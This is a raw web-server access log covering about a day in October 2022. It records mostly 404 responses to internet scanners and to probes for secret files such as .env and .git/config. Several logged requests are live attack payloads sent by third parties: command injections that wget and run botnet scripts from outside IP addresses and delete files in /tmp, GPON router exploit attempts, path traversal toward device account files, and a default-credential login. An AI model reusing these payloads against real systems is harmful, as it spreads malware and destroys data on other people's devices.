167.94.138.62 - - [12/Oct/2022:15:46:31 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
206.189.139.19 - - [12/Oct/2022:16:04:55 +0000] "\xB7\x84\xD5RM\x85\xA9\xA9\x07R\xC7\xD0\x12\x82\xB0\xD6" 400 154 "-" "-"
206.189.139.19 - - [12/Oct/2022:16:04:56 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x14\x19\xDB\xA7\xAE\xEE\xA7\x8D\xA2p\xB3b\xFA\x8E;\x870\xF3\xB5\x08\xCD\x8C" 400 154 "-" "-"
206.189.139.19 - - [12/Oct/2022:16:04:56 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xBE1dH\x95\x07\x09E\x0F7\xC3\xFAlhlY\xFE\x85\xA9|\x04\x1E/\xFFT(\x1A\x82\xE3\xF4cg\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
206.189.139.19 - - [12/Oct/2022:16:04:56 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
68.3.58.82 - - [12/Oct/2022:16:20:06 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
198.98.59.132 - - [12/Oct/2022:16:28:13 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
152.89.196.211 - - [12/Oct/2022:16:36:29 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.133.214.139 - - [12/Oct/2022:16:44:25 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.133.214.139 - - [12/Oct/2022:16:44:26 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.233.50.179 - - [12/Oct/2022:17:05:17 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
198.98.59.132 - - [12/Oct/2022:17:20:33 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
152.89.196.211 - - [12/Oct/2022:17:25:17 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.235.24.181 - - [12/Oct/2022:17:34:16 +0000] "GET / HTTP/1.1" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
156.96.155.243 - - [12/Oct/2022:18:07:53 +0000] "GET / HTTP/1.1" 404 122 "-" "Linux Gnu (cow)"
198.98.59.132 - - [12/Oct/2022:18:08:11 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
122.194.11.113 - - [12/Oct/2022:18:12:12 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 122 "-" "Hello, World"
122.194.11.113 - - [12/Oct/2022:18:12:13 +0000] "sh+/tmp/gpon80&ipv=0" 400 154 "-" "-"
198.98.59.132 - - [12/Oct/2022:19:22:03 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
157.230.9.147 - - [12/Oct/2022:19:32:49 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
194.165.16.77 - - [12/Oct/2022:19:37:48 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
194.165.16.77 - - [12/Oct/2022:19:37:48 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
112.165.126.138 - - [12/Oct/2022:19:56:35 +0000] "GET / HTTP/1.0" 404 552 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
198.98.59.132 - - [12/Oct/2022:21:03:04 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
80.66.66.27 - - [12/Oct/2022:21:05:21 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
128.1.248.42 - - [12/Oct/2022:21:47:47 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
198.98.59.132 - - [12/Oct/2022:22:02:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
45.61.185.198 - - [12/Oct/2022:22:49:29 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
195.178.120.55 - - [12/Oct/2022:22:52:52 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
92.255.85.183 - - [12/Oct/2022:23:10:57 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
198.98.59.132 - - [12/Oct/2022:23:29:10 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
192.241.220.206 - - [12/Oct/2022:23:45:32 +0000] "GET /portal/redlion HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
181.214.41.90 - - [12/Oct/2022:23:54:35 +0000] "GET /api.php?key=1&apikey=1 HTTP/1.1" 404 150 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
45.61.185.198 - - [13/Oct/2022:00:06:37 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.206.85 - - [13/Oct/2022:00:11:06 +0000] "GET /actuator/health HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
112.226.4.124 - - [13/Oct/2022:00:17:07 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 122 "-" "Hello, World"
112.226.4.124 - - [13/Oct/2022:00:17:08 +0000] "sh+/tmp/gpon80&ipv=0" 400 154 "-" "-"
45.61.185.198 - - [13/Oct/2022:00:48:59 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
198.98.59.132 - - [13/Oct/2022:00:54:42 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
195.178.120.33 - - [13/Oct/2022:01:22:01 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
195.178.120.33 - - [13/Oct/2022:01:22:01 +0000] "GET /cgi-bin/;cd+%2Ftmp%3Bwget+http%3A%2F%2F45.95.55.214%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+Netgear%3Brm+-rf+wget.sh HTTP/1.1" 404 122 "-" "Momentum"
198.98.59.132 - - [13/Oct/2022:02:17:16 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
92.118.39.30 - - [13/Oct/2022:02:42:38 +0000] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 154 "-" "-"
183.87.13.48 - - [13/Oct/2022:02:54:02 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
192.241.206.47 - - [13/Oct/2022:02:54:10 +0000] "GET /hudson HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.213 - - [13/Oct/2022:03:00:20 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
162.142.125.213 - - [13/Oct/2022:03:00:20 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.213 - - [13/Oct/2022:03:00:21 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
122.194.11.99 - - [13/Oct/2022:03:43:57 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 150 "-" "-"
198.98.59.132 - - [13/Oct/2022:03:47:09 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
185.189.182.234 - - [13/Oct/2022:04:35:05 +0000] "GET / HTTP/1.1" 400 154 "-" "-"
156.199.222.65 - - [13/Oct/2022:04:42:02 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 150 "-" "Hello, world"
156.199.222.65 - - [13/Oct/2022:04:42:03 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 150 "-" "Hello, world"
206.189.16.167 - - [13/Oct/2022:04:46:36 +0000] "GET /attachments HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
123.199.35.20 - - [13/Oct/2022:05:01:25 +0000] "GET / HTTP/1.0" 404 552 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
198.98.59.132 - - [13/Oct/2022:05:05:45 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
205.185.116.25 - - [13/Oct/2022:05:15:57 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.25 - - [13/Oct/2022:05:15:57 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
192.241.217.239 - - [13/Oct/2022:06:29:18 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
198.98.59.132 - - [13/Oct/2022:06:57:22 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
192.241.219.59 - - [13/Oct/2022:07:53:32 +0000] "MGLNDD_84.185.48.86_80" 400 154 "-" "-"
198.98.59.132 - - [13/Oct/2022:08:20:51 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
45.61.185.198 - - [13/Oct/2022:08:24:19 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
167.94.138.62 - - [13/Oct/2022:08:42:52 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
167.94.138.62 - - [13/Oct/2022:08:42:52 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.62 - - [13/Oct/2022:08:42:52 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
80.94.92.239 - - [13/Oct/2022:08:52:21 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.180.143.18 - - [13/Oct/2022:09:08:53 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
4.240.83.30 - - [13/Oct/2022:09:40:32 +0000] "GET /.env HTTP/1.1" 404 122 "-" "python-requests/2.28.1"
34.76.158.233 - - [13/Oct/2022:09:41:03 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.28.1"
45.61.185.198 - - [13/Oct/2022:10:05:07 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
54.166.35.42 - - [13/Oct/2022:10:46:01 +0000] "GET / HTTP/1.1" 404 122 "-" "Linux Gnu (cow)"
198.98.59.132 - - [13/Oct/2022:11:09:15 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
143.0.68.13 - - [13/Oct/2022:11:20:09 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
161.35.178.83 - - [13/Oct/2022:11:22:21 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
161.35.178.83 - - [13/Oct/2022:11:24:13 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
161.35.178.83 - - [13/Oct/2022:11:24:13 +0000] "GET /favicon.ico HTTP/1.1" 404 122 "http://84.185.48.86/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
45.61.185.198 - - [13/Oct/2022:11:34:13 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
65.112.30.162 - - [13/Oct/2022:11:45:28 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
65.112.30.162 - - [13/Oct/2022:11:45:29 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
1.22.130.89 - - [13/Oct/2022:12:01:59 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
128.199.44.166 - - [13/Oct/2022:12:11:05 +0000] "HEAD / HTTP/1.0" 404 0 "-" "-"
128.199.44.166 - - [13/Oct/2022:12:11:05 +0000] "GET /system_api.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
128.199.44.166 - - [13/Oct/2022:12:11:05 +0000] "GET /c/version.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
128.199.44.166 - - [13/Oct/2022:12:11:06 +0000] "GET /streaming/clients_live.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
128.199.44.166 - - [13/Oct/2022:12:11:06 +0000] "GET /stalker_portal/c/version.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
128.199.44.166 - - [13/Oct/2022:12:11:06 +0000] "GET /stream/live.php HTTP/1.1" 404 122 "-" "Roku/DVP-9.10 (289.10E04111A)"
128.199.44.166 - - [13/Oct/2022:12:11:06 +0000] "GET /flu/403.html HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
128.199.44.166 - - [13/Oct/2022:12:11:07 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xAD\x09\xE8b]\xFFr\x13\xAB\xF6\x97\xCB#F\xA4\x9D\xBFv\x09\xDE0\x17\xF9L\xEA\xF9(\x15\xCDd/N F\xB8\x85 \x9B\x10\xDE|3\xCF\x80\xFA\xDA\xB7?_\x15;D(\xF3\xDA\x84\xDA7\xA0\xF1R\xF3\x9C\xA2\x16\x00&\xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET / HTTP/1.1" 400 154 "-" "-"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET / HTTP/1.1" 404 150 "-" "l9tcpid/v1.1.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /.DS_Store HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /idx_config/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /telescope/requests HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /info.php HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /.json HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /server-status HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
35.216.132.205 - - [13/Oct/2022:12:58:37 +0000] "GET /config.json HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
193.142.146.35 - - [13/Oct/2022:13:06:21 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
193.142.146.35 - - [13/Oct/2022:13:06:21 +0000] "POST /HNAP1/ HTTP/1.1" 404 122 "-" "Mozila/5.0"
213.226.123.241 - - [13/Oct/2022:13:59:48 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03)6\xF4\xE87jP\x85\xC1\x03N\x03\x9D1\xEFN'\xE5\x8B\xDE!\xFD\xF4\x8Fcs\x8C\xEE-i\x1CZ \x8D\x9D\x94\x19\xD8\xFAW\xC0\x04\x9D\x17&\xA2\xBD\x8Cy\xECg\x97B(\xFB\xABu>\xE6\xC6\x1A!o\xB4\xD7\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
213.226.123.241 - - [13/Oct/2022:13:59:48 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3"
198.98.59.132 - - [13/Oct/2022:14:04:13 +0000] "GET / HTTP/1.1" 404 150 "-" "Hello World"
23.90.160.122 - - [13/Oct/2022:14:26:18 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
43.131.66.209 - - [13/Oct/2022:14:31:04 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03I\x06\xB2\xF9\xBC\x99i\xC0Y\xFB\xF8\xBAe-\x83Ud]\x0E\x8D\xB7b8\xB4g\xC6\xDD9dZ8f g\xC1\x81i\xB3\xF6\xF2\xCB\xB0\xA9\x19N\xD6\xBD\x95g|p\xFC\xE9<Z\xA1\x90T\xB7\xE9\xA58'O;\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
118.190.57.26 - - [13/Oct/2022:14:36:04 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
94.102.61.10 - - [13/Oct/2022:15:29:27 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
159.65.16.83 - - [13/Oct/2022:15:48:33 +0000] "GET / HTTP/1.1" 404 122 "https://www.google.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"
147.124.222.183 - - [13/Oct/2022:16:12:41 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
128.14.134.134 - - [13/Oct/2022:16:22:58 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
164.92.255.241 - - [13/Oct/2022:17:33:21 +0000] "HELP" 400 154 "-" "-"
164.92.255.241 - - [13/Oct/2022:17:33:22 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03\xB3\xEF\xC2\x11\xB4R7{]\xFFP.\x88K\xC2H\xEF`\x02\xCE*t\x1D]\xE6\xE3]\xE1\xF4;\xF7] /@\xFAP\x99E\xB2\x1D\xA5\xB2\xF1\xD4\xAD)J\xC63p\xB5P\xF9\x9957`\xBB6\xAE\xF9\x0E]\xFF\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
35.158.99.185 - - [13/Oct/2022:18:01:40 +0000] "GET /.well-known/acme-challenge/OKbDTbBL1VXrVMH3KDprVp76kKuQa-DR7cDrymg2gMY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.138.125.98 - - [13/Oct/2022:18:01:40 +0000] "GET /.well-known/acme-challenge/OKbDTbBL1VXrVMH3KDprVp76kKuQa-DR7cDrymg2gMY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
18.236.201.114 - - [13/Oct/2022:18:01:40 +0000] "GET /.well-known/acme-challenge/OKbDTbBL1VXrVMH3KDprVp76kKuQa-DR7cDrymg2gMY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
23.178.112.103 - - [13/Oct/2022:18:01:40 +0000] "GET /.well-known/acme-challenge/OKbDTbBL1VXrVMH3KDprVp76kKuQa-DR7cDrymg2gMY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
35.158.99.185 - - [13/Oct/2022:18:01:47 +0000] "GET /.well-known/acme-challenge/a0JLKUFY3cVKTHeUSkuH5OkSjzVyK9Mt1GM7ESHB1jY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
23.178.112.208 - - [13/Oct/2022:18:01:47 +0000] "GET /.well-known/acme-challenge/a0JLKUFY3cVKTHeUSkuH5OkSjzVyK9Mt1GM7ESHB1jY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.138.125.98 - - [13/Oct/2022:18:01:47 +0000] "GET /.well-known/acme-challenge/a0JLKUFY3cVKTHeUSkuH5OkSjzVyK9Mt1GM7ESHB1jY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
18.236.201.114 - - [13/Oct/2022:18:01:47 +0000] "GET /.well-known/acme-challenge/a0JLKUFY3cVKTHeUSkuH5OkSjzVyK9Mt1GM7ESHB1jY HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
35.158.99.185 - - [13/Oct/2022:18:02:00 +0000] "GET /.well-known/acme-challenge/Yb-WYrPXLrp3EK-J4GEb4NLc-y71MGh-4gp5FafFaig HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.138.125.98 - - [13/Oct/2022:18:02:01 +0000] "GET /.well-known/acme-challenge/Yb-WYrPXLrp3EK-J4GEb4NLc-y71MGh-4gp5FafFaig HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
23.178.112.203 - - [13/Oct/2022:18:02:01 +0000] "GET /.well-known/acme-challenge/Yb-WYrPXLrp3EK-J4GEb4NLc-y71MGh-4gp5FafFaig HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
18.236.201.114 - - [13/Oct/2022:18:02:01 +0000] "GET /.well-known/acme-challenge/Yb-WYrPXLrp3EK-J4GEb4NLc-y71MGh-4gp5FafFaig HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
35.158.99.185 - - [13/Oct/2022:18:02:07 +0000] "GET /.well-known/acme-challenge/SgWFT3ThVZKP6b1sCYtbv0iW_AgdpSHIH8fM1kTVnEs HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.138.125.98 - - [13/Oct/2022:18:02:07 +0000] "GET /.well-known/acme-challenge/SgWFT3ThVZKP6b1sCYtbv0iW_AgdpSHIH8fM1kTVnEs HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
18.236.201.114 - - [13/Oct/2022:18:02:08 +0000] "GET /.well-known/acme-challenge/SgWFT3ThVZKP6b1sCYtbv0iW_AgdpSHIH8fM1kTVnEs HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
